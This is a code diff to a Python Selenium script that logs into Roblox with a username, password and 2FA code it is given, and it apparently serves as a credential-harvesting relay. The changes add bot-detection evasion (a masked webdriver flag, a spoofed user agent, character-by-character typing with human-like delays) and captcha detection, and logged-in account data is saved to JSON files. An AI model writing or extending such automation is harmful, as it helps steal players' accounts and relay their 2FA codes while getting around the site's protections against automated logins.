@@ -73,6 +73,29 @@ def generate_filename():
     rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
     return f"account_{timestamp}_{rand_str}.json"
 
+def init_driver():
+    """Initialize ChromeDriver without Chrome binary"""
+    try:
+        chrome_options = get_chrome_options()
+        
+        # Указываем использовать ChromeDriver без Chrome binary
+        service = Service(ChromeDriverManager().install())
+        
+        # Настройки для работы без Chrome binary
+        driver = webdriver.Chrome(service=service, options=chrome_options)
+        
+        # Маскировка headless режима
+        driver.execute_cdp_cmd("Network.setUserAgentOverride", {
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
+        })
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        
+        return driver
+        
+    except Exception as e:
+        logger.error(f"Driver initialization failed: {str(e)}")
+        raise Exception("Browser initialization error")
+
 def init_repository():
     """Инициализирует git репозиторий"""
     try:
@@ -123,7 +146,7 @@ def human_like_delay(min_sec=0.1, max_sec=0.5):
     time.sleep(random.uniform(min_sec, max_sec))
 
 def get_chrome_options():
-    """Configure Chrome options for Render.com without system Chrome"""
+    """Configure Chrome options that work without Chrome binary"""
     options = Options()
     
     # Основные настройки для headless режима
@@ -133,44 +156,68 @@ def get_chrome_options():
     options.add_argument("--disable-gpu")
     options.add_argument("--window-size=1920,1080")
     
-    # Опции для избежания детектирования автоматизации
+    # Опции для избежания детектирования
     options.add_argument("--disable-blink-features=AutomationControlled")
     options.add_experimental_option("excludeSwitches", ["enable-automation"])
     options.add_experimental_option("useAutomationExtension", False)
     
-    # User-Agent для маскировки
+    # User-Agent
     options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36")
-    
-    # Дополнительные настройки для стабильности
-    options.add_argument("--disable-extensions")
-    options.add_argument("--disable-notifications")
-    options.add_argument("--log-level=3")
     
     return options
 
 def process_login(username, password, code_2fa=None):
-    """Handle login process for Render.com"""
+    """Handle login process with comprehensive error handling and headless Chrome"""
     driver = None
     try:
-        # Инициализация драйвера
+        # 1. Initialize browser with headless Chrome
         try:
-            chrome_options = get_chrome_options()
+            chrome_options = Options()
+            
+            # Essential settings for Render.com
+            chrome_options.add_argument("--headless=new")
+            chrome_options.add_argument("--no-sandbox")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            chrome_options.add_argument("--disable-gpu")
+            chrome_options.add_argument("--window-size=1920,1080")
+            
+            # Anti-detection settings
+            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
+            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            chrome_options.add_experimental_option("useAutomationExtension", False)
+            chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36")
+
+            # Initialize driver
             service = Service(ChromeDriverManager().install())
             driver = webdriver.Chrome(service=service, options=chrome_options)
             
-            # Маскировка headless режима
+            # Mask headless detection
             driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            driver.execute_cdp_cmd("Network.setUserAgentOverride", {
+                "userAgent": driver.execute_script("return navigator.userAgent;").replace("Headless", "")
+            })
+            
         except Exception as e:
-            logger.error(f"Driver initialization failed: {str(e)}")
+            logger.error(f"Browser initialization failed: {str(e)}")
             return {'status': 'error', 'message': 'System error. Please try later'}
-        # 2. Navigate to login page
-        try:
-            driver.get("https://www.roblox.com/login")
-            human_like_delay(1, 2)
-        except Exception as e:
-            logger.error(f"Failed to load login page: {str(e)}")
-            return {'status': 'error', 'message': 'Connection error. Please try later'}
-        
+
+        # 2. Navigate to login page with retry logic
+        max_retries = 2
+        for attempt in range(max_retries):
+            try:
+                driver.get("https://www.roblox.com/login")
+                WebDriverWait(driver, 10).until(
+                    EC.presence_of_element_located((By.ID, "login-username")))
+                break
+            except Exception as e:
+                if attempt == max_retries - 1:
+                    logger.error(f"Failed to load login page after {max_retries} attempts: {str(e)}")
+                    return {'status': 'error', 'message': 'Connection error. Please try later'}
+                human_like_delay(1, 3)
+                continue
+
+        human_like_delay(1, 2)
+
         # 3. Handle cookies if present
         try:
             cookie_btn = WebDriverWait(driver, 3).until(
@@ -179,21 +226,24 @@ def process_login(username, password, code_2fa=None):
             human_like_delay(0.5, 1.5)
         except:
             pass  # Cookie banner not found is acceptable
-        
-        # 4. Fill credentials
+
+        # 4. Fill credentials with error handling
         try:
             username_field = WebDriverWait(driver, 10).until(
                 EC.presence_of_element_located((By.ID, "login-username")))
-            username_field.send_keys(username)
-            human_like_delay(0.2, 0.5)
+            for char in username:
+                username_field.send_keys(char)
+                human_like_delay(0.05, 0.1)
             
             password_field = driver.find_element(By.ID, "login-password")
-            password_field.send_keys(password)
-            human_like_delay(0.2, 0.5)
+            for char in password:
+                password_field.send_keys(char)
+                human_like_delay(0.05, 0.1)
+                
         except Exception as e:
             logger.error(f"Failed to fill credentials: {str(e)}")
             return {'status': 'error', 'message': 'System error. Please try later'}
-        
+
         # 5. Submit login form
         try:
             login_btn = driver.find_element(By.ID, "login-button")
@@ -202,14 +252,15 @@ def process_login(username, password, code_2fa=None):
         except Exception as e:
             logger.error(f"Failed to submit login form: {str(e)}")
             return {'status': 'error', 'message': 'System error. Please try later'}
-        
+
         # 6. Handle 2FA if required
         if code_2fa:
             try:
                 code_field = WebDriverWait(driver, 5).until(
                     EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
-                code_field.send_keys(code_2fa)
-                human_like_delay(0.5, 1)
+                for char in code_2fa:
+                    code_field.send_keys(char)
+                    human_like_delay(0.1, 0.2)
                 
                 submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify')]")
                 submit_btn.click()
@@ -225,11 +276,16 @@ def process_login(username, password, code_2fa=None):
                 return {'status': '2fa_required', 'message': '2FA verification required'}
             except TimeoutException:
                 pass  # 2FA not required
-        
-        # 7. Verify successful login
+
+        # 7. Verify successful login with multiple checks
         try:
+            # Check for avatar container (main success indicator)
             WebDriverWait(driver, 10).until(
                 EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container')]")))
+            
+            # Additional verification - check for logout button
+            WebDriverWait(driver, 5).until(
+                EC.presence_of_element_located((By.XPATH, "//a[contains(@href, 'logout')]")))
             
             # Get account data
             account_data = {
@@ -247,7 +303,12 @@ def process_login(username, password, code_2fa=None):
             error_msg = check_for_errors(driver)
             if error_msg:
                 logger.info(f"Login failed with message: {error_msg}")
-                return {'status': 'error', 'message': 'Invalid credentials'}
+                return {'status': 'error', 'message': error_msg}
+            
+            # Check for captcha
+            if "captcha" in driver.page_source.lower():
+                logger.error("Captcha detected")
+                return {'status': 'error', 'message': 'Security check required'}
             
             logger.error("Login failed without specific error message")
             return {'status': 'error', 'message': 'Login failed. Please try later'}
@@ -262,7 +323,6 @@ def process_login(username, password, code_2fa=None):
                 driver.quit()
             except Exception as e:
                 logger.warning(f"Failed to properly close browser: {str(e)}")
-                pass
 
 def check_for_errors(driver):
     """Check page for known error messages"""
